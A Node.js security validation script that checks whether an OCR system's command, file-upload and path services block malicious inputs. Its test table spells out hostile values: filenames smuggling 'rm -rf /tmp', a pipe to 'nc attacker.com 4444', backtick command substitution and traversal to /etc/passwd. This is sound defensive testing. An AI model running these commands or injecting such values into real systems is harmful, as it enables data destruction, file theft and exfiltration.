#!/usr/bin/env node

/**
 * OCR Security Validation Script
 *
 * Comprehensive security testing for the OCR system to verify that
 * critical vulnerabilities have been fixed.
 */

const fs = require('fs').promises;
const path = require('path');
const { spawn } = require('child_process');

/**
 * Security test suite configuration
 */
const SECURITY_TESTS = {
  commandInjection: [
    {
      name: 'Filename Command Injection',
      input: 'test"; rm -rf /tmp; echo "pwned',
      expectedResult: 'BLOCKED',
      severity: 'CRITICAL',
    },
    {
      name: 'Path Traversal Attack',
      input: '../../../etc/passwd',
      expectedResult: 'BLOCKED',
      severity: 'CRITICAL',
    },
    {
      name: 'Shell Metacharacters',
      input: 'test.jpg && cat /etc/hosts',
      expectedResult: 'BLOCKED',
      severity: 'CRITICAL',
    },
    {
      name: 'Pipe Command Injection',
      input: 'test.jpg | nc attacker.com 4444',
      expectedResult: 'BLOCKED',
      severity: 'CRITICAL',
    },
    {
      name: 'Backtick Command Substitution',
      input: 'test`whoami`.jpg',
      expectedResult: 'BLOCKED',
      severity: 'CRITICAL',
    },
  ],

  fileValidation: [
    {
      name: 'Invalid MIME Type',
      mimetype: 'application/x-executable',
      expectedResult: 'BLOCKED',
      severity: 'HIGH',
    },
    {
      name: 'Executable File Upload',
      filename: 'malicious.sh',
      expectedResult: 'BLOCKED',
      severity: 'HIGH',
    },
    {
      name: 'Zero-byte File',
      size: 0,
      expectedResult: 'BLOCKED',
      severity: 'MEDIUM',
    },
    {
      name: 'Oversized File',
      size: 100 * 1024 * 1024, // 100MB
      expectedResult: 'BLOCKED',
      severity: 'MEDIUM',
    },
  ],

  pathValidation: [
    {
      name: 'Directory Traversal',
      path: '/tmp/../../../etc/passwd',
      expectedResult: 'BLOCKED',
      severity: 'CRITICAL',
    },
    {
      name: 'Absolute Path Outside Upload Dir',
      path: '/etc/hosts',
      expectedResult: 'BLOCKED',
      severity: 'CRITICAL',
    },
    {
      name: 'Symlink Attack',
      path: '/tmp/link_to_sensitive_file',
      expectedResult: 'BLOCKED',
      severity: 'HIGH',
    },
  ],
};

/**
 * Main security validation function
 */
async function validateOCRSecurity() {
  console.log('🔒 Starting OCR Security Validation...\n');

  const results = {
    passed: 0,
    failed: 0,
    blocked: 0,
    critical: 0,
    high: 0,
    medium: 0,
    tests: [],
  };

  try {
    // Test 1: Command Injection Prevention
    console.log('🧪 Testing Command Injection Prevention...');
    await testCommandInjectionPrevention(results);

    // Test 2: File Validation
    console.log('\n🧪 Testing File Validation...');
    await testFileValidation(results);

    // Test 3: Path Validation
    console.log('\n🧪 Testing Path Validation...');
    await testPathValidation(results);

    // Test 4: Service Integration
    console.log('\n🧪 Testing Service Integration...');
    await testServiceIntegration(results);

    // Generate security report
    await generateSecurityReport(results);
  } catch (error) {
    console.error('❌ Security validation failed:', error.message);
    process.exit(1);
  }
}

/**
 * Tests command injection prevention
 */
async function testCommandInjectionPrevention(results) {
  for (const test of SECURITY_TESTS.commandInjection) {
    console.log(`  Testing: ${test.name}`);

    try {
      // Import secure services
      const { secureCommandService } = require('../services/secureCommandService');

      // Attempt to execute with malicious input
      try {
        await secureCommandService.executeSecureCommand('tesseract', [test.input, 'stdout']);

        // If we get here, the test failed (should have been blocked)
        recordTestResult(results, test, 'FAILED', 'Malicious input was not blocked');
      } catch (error) {
        if ((error.code && error.code.includes('SECURITY')) || error.code.includes('DANGEROUS')) {
          recordTestResult(results, test, 'PASSED', 'Malicious input was correctly blocked');
        } else {
          recordTestResult(results, test, 'FAILED', `Unexpected error: ${error.message}`);
        }
      }
    } catch (importError) {
      recordTestResult(
        results,
        test,
        'FAILED',
        `Could not import secure service: ${importError.message}`
      );
    }
  }
}

/**
 * Tests file validation
 */
async function testFileValidation(results) {
  for (const test of SECURITY_TESTS.fileValidation) {
    console.log(`  Testing: ${test.name}`);

    try {
      // Import secure file upload service
      const { secureFileUploadService } = require('../services/secureFileUploadService');

      // Create mock file object
      const mockFile = {
        originalname: test.filename || 'test.jpg',
        mimetype: test.mimetype || 'image/jpeg',
        size: test.size || 1024,
        buffer: Buffer.alloc(test.size || 1024),
      };

      try {
        await secureFileUploadService.validateAndSecureFile(mockFile);

        // If we get here and expected to be blocked, test failed
        if (test.expectedResult === 'BLOCKED') {
          recordTestResult(results, test, 'FAILED', 'Invalid file was not blocked');
        } else {
          recordTestResult(results, test, 'PASSED', 'Valid file was accepted');
        }
      } catch (error) {
        if (test.expectedResult === 'BLOCKED' && error.code && error.code.includes('SECURITY')) {
          recordTestResult(results, test, 'PASSED', 'Invalid file was correctly blocked');
        } else {
          recordTestResult(results, test, 'FAILED', `Unexpected error: ${error.message}`);
        }
      }
    } catch (importError) {
      recordTestResult(
        results,
        test,
        'FAILED',
        `Could not import secure service: ${importError.message}`
      );
    }
  }
}

/**
 * Tests path validation
 */
async function testPathValidation(results) {
  for (const test of SECURITY_TESTS.pathValidation) {
    console.log(`  Testing: ${test.name}`);

    try {
      // Import secure file upload service
      const { secureFileUploadService } = require('../services/secureFileUploadService');

      try {
        secureFileUploadService.validatePathForOCR(test.path);

        // If we get here and expected to be blocked, test failed
        if (test.expectedResult === 'BLOCKED') {
          recordTestResult(results, test, 'FAILED', 'Dangerous path was not blocked');
        } else {
          recordTestResult(results, test, 'PASSED', 'Valid path was accepted');
        }
      } catch (error) {
        if (test.expectedResult === 'BLOCKED' && error.code && error.code.includes('SECURITY')) {
          recordTestResult(results, test, 'PASSED', 'Dangerous path was correctly blocked');
        } else {
          recordTestResult(results, test, 'FAILED', `Unexpected error: ${error.message}`);
        }
      }
    } catch (importError) {
      recordTestResult(
        results,
        test,
        'FAILED',
        `Could not import secure service: ${importError.message}`
      );
    }
  }
}

/**
 * Tests service integration
 */
async function testServiceIntegration(results) {
  const integrationTests = [
    {
      name: 'Secure Command Service Available',
      severity: 'CRITICAL',
    },
    {
      name: 'Secure File Upload Service Available',
      severity: 'CRITICAL',
    },
    {
      name: 'Secure Enhanced OCR Service Available',
      severity: 'CRITICAL',
    },
    {
      name: 'Secure Multi-Provider OCR Service Available',
      severity: 'HIGH',
    },
    {
      name: 'Secure Image Preprocessing Service Available',
      severity: 'HIGH',
    },
  ];

  for (const test of integrationTests) {
    console.log(`  Testing: ${test.name}`);

    try {
      const serviceName = test.name
        .toLowerCase()
        .replace('secure ', '')
        .replace(' available', '')
        .replace(/ /g, '');

      let serviceModule;

      switch (serviceName) {
        case 'commandservice':
          serviceModule = require('../services/secureCommandService');
          break;
        case 'fileuploadservice':
          serviceModule = require('../services/secureFileUploadService');
          break;
        case 'enhancedocrservice':
          serviceModule = require('../services/secureEnhancedOCRService');
          break;
        case 'multi-providerocrservice':
          serviceModule = require('../services/secureMultiProviderOCRService');
          break;
        case 'imagepreprocessingservice':
          serviceModule = require('../services/secureImagePreprocessingService');
          break;
      }

      if (serviceModule) {
        recordTestResult(results, test, 'PASSED', 'Service loaded successfully');
      } else {
        recordTestResult(results, test, 'FAILED', 'Service not available');
      }
    } catch (error) {
      recordTestResult(results, test, 'FAILED', `Service import failed: ${error.message}`);
    }
  }
}

/**
 * Records test result
 */
function recordTestResult(results, test, status, message) {
  const result = {
    name: test.name,
    severity: test.severity,
    status,
    message,
    timestamp: new Date().toISOString(),
  };

  results.tests.push(result);

  if (status === 'PASSED') {
    results.passed++;
    console.log(`    ✅ PASSED: ${message}`);
  } else if (status === 'BLOCKED') {
    results.blocked++;
    console.log(`    🛡️  BLOCKED: ${message}`);
  } else {
    results.failed++;
    console.log(`    ❌ FAILED: ${message}`);
  }

  // Count by severity
  switch (test.severity) {
    case 'CRITICAL':
      results.critical++;
      break;
    case 'HIGH':
      results.high++;
      break;
    case 'MEDIUM':
      results.medium++;
      break;
  }
}

/**
 * Generates security report
 */
async function generateSecurityReport(results) {
  console.log('\n📊 SECURITY VALIDATION REPORT');
  console.log('================================');
  console.log(`Total Tests: ${results.tests.length}`);
  console.log(`Passed: ${results.passed}`);
  console.log(`Failed: ${results.failed}`);
  console.log(`Blocked: ${results.blocked}`);
  console.log('');
  console.log('By Severity:');
  console.log(`Critical: ${results.critical}`);
  console.log(`High: ${results.high}`);
  console.log(`Medium: ${results.medium}`);

  // Calculate security score
  const totalTests = results.tests.length;
  const securityScore = Math.round((results.passed / totalTests) * 100);

  console.log(`\n🎯 Security Score: ${securityScore}%`);

  if (securityScore >= 90) {
    console.log('✅ EXCELLENT: OCR system is well secured');
  } else if (securityScore >= 75) {
    console.log('⚠️  GOOD: OCR system has good security but needs improvement');
  } else if (securityScore >= 50) {
    console.log('🔶 FAIR: OCR system has basic security but significant issues remain');
  } else {
    console.log('🔴 POOR: OCR system has serious security vulnerabilities');
  }

  // List failed tests
  const failedTests = results.tests.filter(t => t.status === 'FAILED');
  if (failedTests.length > 0) {
    console.log('\n❌ FAILED TESTS:');
    failedTests.forEach(test => {
      console.log(`  • ${test.name} (${test.severity}): ${test.message}`);
    });
  }

  // Save detailed report
  const reportPath = path.join(__dirname, '..', `ocr-security-report-${Date.now()}.json`);
  await fs.writeFile(
    reportPath,
    JSON.stringify(
      {
        summary: {
          totalTests: results.tests.length,
          passed: results.passed,
          failed: results.failed,
          blocked: results.blocked,
          securityScore,
          timestamp: new Date().toISOString(),
        },
        tests: results.tests,
      },
      null,
      2
    )
  );

  console.log(`\n📄 Detailed report saved to: ${reportPath}`);

  // Exit with appropriate code
  if (results.failed > 0) {
    console.log('\n⚠️  Some security tests failed. Please review and fix issues before deploying.');
    process.exit(1);
  } else {
    console.log('\n🎉 All security tests passed! OCR system is secure.');
    process.exit(0);
  }
}

/**
 * Checks if vulnerable services still exist
 */
async function checkForVulnerableServices() {
  console.log('🔍 Checking for vulnerable services...');

  const vulnerableFiles = [
    'services/enhancedOCRService.js',
    'services/multiProviderOCRService.js',
    'services/imagePreprocessingService.js',
  ];

  const foundVulnerable = [];

  for (const file of vulnerableFiles) {
    const filePath = path.join(__dirname, '..', file);
    try {
      const content = await fs.readFile(filePath, 'utf-8');

      // Check for vulnerable patterns
      if (
        content.includes('exec(') ||
        (content.includes('spawn(') && !content.includes('secureCommandService'))
      ) {
        foundVulnerable.push(file);
      }
    } catch (error) {
      // File doesn't exist, which is fine
    }
  }

  if (foundVulnerable.length > 0) {
    console.log('⚠️  WARNING: Vulnerable services still found:');
    foundVulnerable.forEach(file => console.log(`  • ${file}`));
    console.log('Please run the migration script first.');
    return false;
  }

  console.log('✅ No vulnerable services found');
  return true;
}

// Main execution
if (require.main === module) {
  (async () => {
    try {
      const safeToTest = await checkForVulnerableServices();
      if (safeToTest) {
        await validateOCRSecurity();
      } else {
        console.log(
          '\n❌ Cannot proceed with security validation while vulnerable services exist.'
        );
        process.exit(1);
      }
    } catch (error) {
      console.error('❌ Security validation script failed:', error.message);
      process.exit(1);
    }
  })();
}

module.exports = {
  validateOCRSecurity,
  SECURITY_TESTS,
};
